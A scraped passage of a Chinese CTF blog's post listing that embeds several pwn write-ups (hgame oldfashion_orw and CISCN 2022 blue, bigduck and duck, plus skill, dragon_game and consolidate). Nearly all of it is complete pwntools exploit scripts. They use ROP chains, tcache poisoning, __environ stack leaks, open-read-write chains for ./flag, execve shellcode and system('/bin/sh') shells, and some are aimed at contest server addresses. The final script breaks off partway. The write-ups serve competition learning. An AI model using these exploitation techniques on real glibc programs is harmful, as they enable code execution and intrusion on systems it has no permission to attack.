pop_rdx=leak_addr+0x1b96
pop_rax=leak_addr+0x43ae8
# syscall=leak_addr+0x13c0
syscall_ret=leak_addr+0xd2745

# gdb.attach(io)
# pause()

# # mprotect()
# io.sendlineafter(b&amp;quot;?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
# io.recvuntil(b&amp;quot;?\n&amp;quot;)
# payload=cyclic(0x38)+p64(pop_rdi)+p64(0x404000)+p64(pop_rsi)+p64(0x1000)+p64(pop_rdx)+p64(7)+p64(mprotect_a)+p64(elf.sym[b&amp;quot;read&amp;quot;])+p64(0x401311)
# io.send(payload)

#open
# orw=p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
orw=p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss_addr+0x200)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss_addr+0x200)+p64(pop_rdx)+p64(0x50)+p64(write_a)

io.sendlineafter(b&amp;quot;?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
io.recvuntil(b&amp;quot;?\n&amp;quot;)
payload=cyclic(0x38)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_addr)+p64(pop_rdx)+p64(0x50)+p64(elf.sym[b&amp;quot;read&amp;quot;])+p64(0x401311)
io.send(payload)
io.send(b&amp;quot;./flag&amp;quot;)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
io.recvuntil(b&amp;quot;?\n&amp;quot;)
payload=cyclic(0x38)+orw
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040143c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040143e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401440 : pop r14 ; pop r15 ; ret
# 0x0000000000401442 : pop r15 ; ret
# 0x000000000040143b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040143f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401443 : pop rdi ; ret
# 0x0000000000401441 : pop rsi ; pop r15 ; ret
# 0x000000000040143d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x00000000004012b2 : ret 0x2be
# 0x00000000004013ae : ret 0x8d48

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
">2022_hgame_oldfashion_orw</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/bcvKCEmR-/"" data-c="
          &lt;p&gt;&lt;s&gt;复习不完了沃日&lt;/s&gt;&lt;br&gt;
glibc 2.31-0ubuntu9.8，缺少&lt;code&gt;edit()&lt;/code&gt;的菜单题&lt;br&gt;
有沙盒保护禁用了&lt;code&gt;execve()&lt;/code&gt;，并且程序禁用了&lt;code&gt;__malloc_hook&lt;/code&gt;和&#39;__free_hook&#39;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686898228404.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
此题依旧打堆栈结合的orw rop，不过此题有且仅有一次uaf的机会在&lt;code&gt;case 666&lt;/code&gt;中，&lt;code&gt;show()&lt;/code&gt;也只能使用一次，可以将这一次机会用来泄露libc&lt;br&gt;
不过打堆栈结合的rop仍需知道栈地址，于是我们可以考虑劫持堆到&lt;code&gt;_IO_2_1_stdout&lt;/code&gt;处泄露&lt;code&gt;__environ&lt;/code&gt;存储的栈地址，之后测算到&lt;code&gt;add()&lt;/code&gt;的ret地址偏移为0x120，我们可以劫持到&lt;code&gt;ret-0x128&lt;/code&gt;处,为&lt;code&gt;./flag\x00\x00&lt;/code&gt;预留空间&lt;br&gt;
此题麻烦的是overlap chunk的创建&lt;br&gt;
可见exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28678)
io=process(&amp;quot;./pwn&amp;quot;)   #禁用hook，禁用execve
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def add(s,cc): #最大0x90
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: \n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content: \n&amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: \n&amp;quot;,str(n))

def show(n):    #只能使用一次
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: \n&amp;quot;,str(n))

def gt(n):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;666&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: \n&amp;quot;,str(n))

gdb.attach(io)
pause()

for i in range(9):
    add(0x90,b&amp;quot;aaa&amp;quot;)  #为了后续构造overlap chunk多分配一个堆块
    
add(0x90,b&amp;quot;bbb&amp;quot;) #9

for i in range(7):
    delete(i)

gt(8)
show(8)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x60-0x1ECB80
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))


open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]
stdout=leak_addr+libc.sym[b&amp;quot;_IO_2_1_stdout_&amp;quot;]
pop_rdi=leak_addr+0x23b6a 
pop_rdx=leak_addr+0x142c92
pop_rax=leak_addr+0x36174
pop_rsi=leak_addr+0x2601f 
ret=leak_addr+0x22679


delete(7) #chunk 7与unsortedbin合并  chunk overlap
add(0x90,b&amp;quot;zzz&amp;quot;) #0 将tcachebin数量减少到6，为unsortedbin预留tcachebin


delete(8) #UAF将unsortedbin放入tcachebin中
add(0x80,b&amp;quot;aaa&amp;quot;) #1
add(0x80,p64(0)+p64(0xa1)+p64(stdout)) #2
add(0x90,b&amp;quot;eee&amp;quot;) #3
add(0x90,p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8)*2) #4

stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

ret_addr=stack_addr-0x128 #偏移为0x120，额外的0x8写./flag字符串

#open
orw=b&amp;quot;./flag\x00\x00&amp;quot;+p64(pop_rdi)+p64(ret_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack_addr+0x200)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rdx)+p64(0x50)+p64(write_a)
#注意orw链长度不能大于创建堆块的大小

delete(3) 
delete(2) #释放堆块再次overlap

add(0x80,p64(0)+p64(0xa1)+p64(ret_addr))
add(0x90,b&amp;quot;eee&amp;quot;)

# gdb.attach(io)
# pause()

add(0x90,orw)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2022 华东北]blue wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/AEGN0vH7Z/"" data-c="
          &lt;p&gt;glibc版本2.33-0ubuntu5&lt;br&gt;
seccomp dump发现禁用&lt;code&gt;execve()&lt;/code&gt;，打orw rop&lt;br&gt;
本题泄露libc地址的时候低字节为&lt;code&gt;\x00&lt;/code&gt;存在00截断，需要修改低字节泄露，后续减去即可&lt;br&gt;
其它跟duck差不多，劫持&lt;code&gt;edit()&lt;/code&gt;的ret打one_gadget&lt;br&gt;
其中&lt;code&gt;__environ&lt;/code&gt;泄露的&lt;code&gt;stack_addr&lt;/code&gt;距离ret为0x120&lt;br&gt;
不过跟duck一样需要额外0x18才能正常分配到目标地址：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686837300331.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686837312166.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
另外此题的&lt;code&gt;pop rdx;ret&lt;/code&gt;指令的偏移在不同找寻方法下偏移会不一样，而且如果直接用&lt;br&gt;
&lt;code&gt;leak_addr+next(libc.search(asm(&amp;quot;pop rdx;ret&amp;quot;)))&lt;/code&gt;会崩溃&lt;br&gt;
但是如果手动找该gadget在libc文件中偏移再加上基址则不会出现问题（雾&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28257)
io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)


def add():
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;1&amp;quot;) #0x100
    
def delete(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))

def edit(n,s,cc):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    io.sendlineafter(&amp;quot;Size: \n&amp;quot;,str(s))
    io.sendafter(&amp;quot;Content: \n&amp;quot;,cc)

# gdb.attach(io)
# pause()

add() #0
add() #1
delete(0)
show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;key: &amp;quot;+hex(key))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

delete(1)
payload=p64((heap_addr+0x10)^key)+p64(0)
edit(1,len(payload),payload)

add() #2
add() #3

payload=b&amp;quot;\x00&amp;quot;*0x4e+b&amp;quot;\x07&amp;quot;
edit(3,len(payload),payload)
delete(3)
payload=b&amp;quot;\x01&amp;quot;
edit(3,len(payload),payload)
show(3)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x71-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


pop_rdi=leak_addr+next(libc.search(asm(&amp;quot;pop rdi;ret&amp;quot;)))
pop_rsi=leak_addr+next(libc.search(asm(&amp;quot;pop rsi;ret&amp;quot;)))
fake_pop_rdx=next(libc.search(asm(&amp;quot;pop rdx;ret&amp;quot;)))
print(&amp;quot;fake_pop_rdx: &amp;quot;+hex(fake_pop_rdx))
pop_rdx=leak_addr+0x0c7f32
pop_rax=leak_addr+next(libc.search(asm(&amp;quot;pop rax;ret&amp;quot;)))
ret=leak_addr+next(libc.search(asm(&amp;quot;ret&amp;quot;)))
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]


payload=b&amp;quot;/flag\x00\x00\x00&amp;quot;+b&amp;quot;\x00&amp;quot;*0x16+b&amp;quot;\x02&amp;quot;
edit(3,len(payload),payload)

delete(1)
payload=p64(environ^key)+p64(0)
edit(1,len(payload),payload)
add() #4
add() #5
show(5)
stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
ret_addr=stack_addr-0x138
print(&amp;quot;ret_addr: &amp;quot;+hex(ret_addr))


delete(4)
payload=p64((ret_addr)^key)+p64(0)
edit(4,len(payload),payload)



#open
orw=p64(0)*3+p64(pop_rdi)+p64(heap_addr+0x10)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(write_a)



payload=b&amp;quot;/flag\x00\x00\x00&amp;quot;+b&amp;quot;\x00&amp;quot;*0x16+b&amp;quot;\x02&amp;quot;
edit(3,len(payload),payload)


add() #6
add() #7

# gdb.attach(io)
# pause()

edit(7,len(orw),orw)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2022 华东北]bigduck wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/VFTFpVn43/"" data-c="
          &lt;p&gt;功能齐全的菜单题，但需要注意的是glibc版本在2.34删除了常用的&lt;code&gt;__malloc_hook&lt;/code&gt;和&lt;code&gt;__free_hook&lt;/code&gt;等常用hook，意味着劫持hook打one_gadget的方式已不可行&lt;br&gt;
本题限制了创建和释放堆块的次数，但并不影响打题的方法&lt;br&gt;
此题我们选择泄露libc后利用&lt;code&gt;__environ&lt;/code&gt;泄露栈地址然后劫持&lt;code&gt;edit()&lt;/code&gt;的ret地址打rop&lt;br&gt;
下图为泄露的栈地址距离ret的偏移为-0x150：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686835329136.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
但是需要再减去0x18才能打通，所以需要分配到&lt;code&gt;stack_addr-0x168&lt;/code&gt;处，所以后续rop链额外需要0x18的padding&lt;br&gt;
两种方式：&lt;/p&gt;
&lt;h4 id=&#34;打tcache-struct泄露libc&#34;&gt;打tcache struct泄露libc：&lt;/h4&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28687)
io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

def add():
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;1&amp;quot;) #0x100
    
def delete(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))

def edit(n,s,cc):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    io.sendlineafter(&amp;quot;Size: \n&amp;quot;,str(s))
    io.sendafter(&amp;quot;Content: \n&amp;quot;,cc)


add() #0
add() #1
delete(0)
show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;key: &amp;quot;,hex(key))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))

delete(1)
payload=p64((heap_addr+0x10)^key)+p64(0)
edit(1,len(payload),payload)
add()#2
add()#3
payload=b&amp;quot;\x00&amp;quot;*0x4e+b&amp;quot;\x07&amp;quot;
edit(3,len(payload),payload)

delete(3)
show(3)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))+0x74a0-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
pop_rdi=leak_addr+next(libc.search(asm(&amp;quot;pop rdi;ret&amp;quot;)))
ret=leak_addr+next(libc.search(asm(&amp;quot;ret&amp;quot;)))

delete(2)
payload=p64(environ^key)+p64(0)
edit(2,len(payload),payload)

payload=b&amp;quot;\x00&amp;quot;*0x1e+b&amp;quot;\x02&amp;quot;
edit(3,len(payload),payload)

add()#4
add()#5
show(5)

stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
ret_addr=stack_addr-0x168
print(&amp;quot;ret_addr: &amp;quot;+hex(ret_addr))

delete(4)
payload=p64(ret_addr^key)+p64(0)
edit(4,len(payload),payload) 

payload=b&amp;quot;\x00&amp;quot;*0x1e+b&amp;quot;\x02&amp;quot;
edit(3,len(payload),payload)

add()#6
add()#7

gdb.attach(io)
pause()

payload=p64(0)*3+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
edit(7,len(payload),payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;释放tcachebin&#34;&gt;释放tcachebin :&lt;/h4&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28687)
# io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

def add():
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;1&amp;quot;) #0x100
    
def delete(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))

def edit(n,s,cc):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    io.sendlineafter(&amp;quot;Size: \n&amp;quot;,str(s))
    io.sendafter(&amp;quot;Content: \n&amp;quot;,cc)

# gdb.attach(io)
# pause()

# edit(0,0x100,p64(count_addr))
# add() #0
# edit(0,0x100,b&amp;quot;\x07&amp;quot;*0x40)
for i in range(8):
    add()
    
add() #8

for i in range(8):
    delete(i)

show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))+0x74a0-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

one_gadget=[0xda861,0xda864,0xda867]
shell=one_gadget[0]+leak_addr
pop_rdi=leak_addr+next(libc.search(asm(&amp;quot;pop rdi;ret&amp;quot;)))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh\x00&amp;quot;))


show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;key: &amp;quot;,hex(key))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))


environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]
print(&amp;quot;environ: &amp;quot;,hex(environ))


for i in range(5):
    add() #9-13

payload=p64(environ^key)+p64(0)
edit(1,len(payload),payload)
add() #14
add() #15
show(15)
stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x168
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

delete(9)
delete(10)

payload=p64(stack_addr^key)+p64(0)
edit(10,len(payload),payload)

add() #16
add() #17

payload=p64(0)*3+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
edit(17,0x30,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2022 华东北]duck wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/2kS7k1Mtb/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN：&lt;/h3&gt;
&lt;h4 id=&#34;skill&#34;&gt;skill：&lt;/h4&gt;
&lt;p&gt;GLIBC 2.23-0ubuntu11.3&lt;br&gt;
菜单下面就只有&lt;code&gt;add()&lt;/code&gt;有用，可以修改bss段上内容以符合后续&lt;code&gt;show()&lt;/code&gt;里面比较函数&lt;br&gt;
后续就是ret2libc模板题，注意libc小版本&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;47.106.35.54&amp;quot;,46655)
# io=process(&amp;quot;./skill&amp;quot;)
elf=ELF(&amp;quot;./skill&amp;quot;)
libc=ELF(&amp;quot;libc.so&amp;quot;)

pop_rdi=0x400c83 
ret=0x400297

def add(cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Input your skill: \n&amp;quot;,cc)

payload=b&amp;quot;song&amp;quot;+b&amp;quot;\x00&amp;quot;*0xc+b&amp;quot;\x00&amp;quot;*4+b&amp;quot;jump&amp;quot;+b&amp;quot;\x00&amp;quot;*4+b&amp;quot;\x00&amp;quot;*0xc+b&amp;quot;rap\x00\x00\x00\x00\x00&amp;quot;+b&amp;quot;\x00&amp;quot;*0xc+b&amp;quot;NBA&amp;quot;
add(payload)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;4&amp;quot;)
payload=cyclic(0x18)+p64(pop_rdi)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x4008b6)
io.sendline(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;4&amp;quot;)

io.recvuntil(b&amp;quot;music~\n&amp;quot;)

payload=cyclic(0x18)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
io.sendline(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c80 : pop r14 ; pop r15 ; ret
# 0x0000000000400c82 : pop r15 ; ret
# 0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400820 : pop rbp ; ret
# 0x0000000000400c83 : pop rdi ; ret
# 0x0000000000400c81 : pop rsi ; pop r15 ; ret
# 0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400297 : ret
# 0x00000000004007a2 : ret 0x2018

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;dragon_game&#34;&gt;dragon_game:&lt;/h4&gt;
&lt;p&gt;绕过一连串判断函数，最后进入到&lt;code&gt;sub_400A5D&lt;/code&gt;在rwx段上写shellcode&lt;br&gt;
有长度限制，可以上exploit-db找&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;47.106.8.27&amp;quot;,46460)
# io=process(&amp;quot;./dragon_game&amp;quot;)
elf=ELF(&amp;quot;./dragon_game&amp;quot;)

io.recvuntil(b&amp;quot;is &amp;quot;)
leak_addr=int(io.recvuntil(&amp;quot;\n&amp;quot;)[:-1],16)
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


io.recvuntil(b&amp;quot;t?:\n&amp;quot;)
io.sendline(b&amp;quot;east&amp;quot;)

io.recvuntil(b&amp;quot;address&#39;\n&amp;quot;)
io.sendline(str(leak_addr))

io.recvuntil(b&amp;quot;is:\n&amp;quot;)
payload=&amp;quot;%{}c%{}$n&amp;quot;.format(233,7)
io.sendline(payload)

shellcode=b&amp;quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;quot;

io.recvuntil(b&amp;quot;LL\n&amp;quot;)
io.send(shellcode)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;consolidate&#34;&gt;consolidate:&lt;/h4&gt;
&lt;p&gt;GLIBC 2.23-0ubuntu11.3（注意小版本，否则one_gadget最后不通&lt;br&gt;
UAF，可以edit after free&lt;br&gt;
dup+修改fd低字节+fake chunk修改size泄露libc&lt;br&gt;
然后最后劫持malloc_hook打one_gadget,注意realloc调栈&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;47.106.8.27&amp;quot;,48046)
# io=process(&amp;quot;./consolidate&amp;quot;)
libc=ELF(&amp;quot;libc-2.23.so&amp;quot;)
# elf=ELF(&amp;quot;./consolidate&amp;quot;)
# one_gadget=[0x45206,0x4525a,0xef9f4,0xf0897]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]

def add(cc):
    io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;content\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;idx\n&amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;idx\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;content\n&amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;idx\n&amp;quot;,str(n))

# gdb.attach(io)
# pause()

add(b&amp;quot;a&amp;quot;) #0
add(b&amp;quot;b&amp;quot;) #1
add(b&amp;quot;c&amp;quot;) #2
add(b&amp;quot;d&amp;quot;) #3
add(b&amp;quot;e&amp;quot;) #4

# edit(0,cyclic(0x60))

delete(0)
delete(1)
delete(0)
edit(0,b&amp;quot;\xa0&amp;quot;)
add(b&amp;quot;a&amp;quot;)
# delete(1)
edit(1,p64(0)*5+p64(0x71))
# delete(1)

add(cyclic(0x38)+p64(0xe1))
delete(2)
show(2)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x68-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
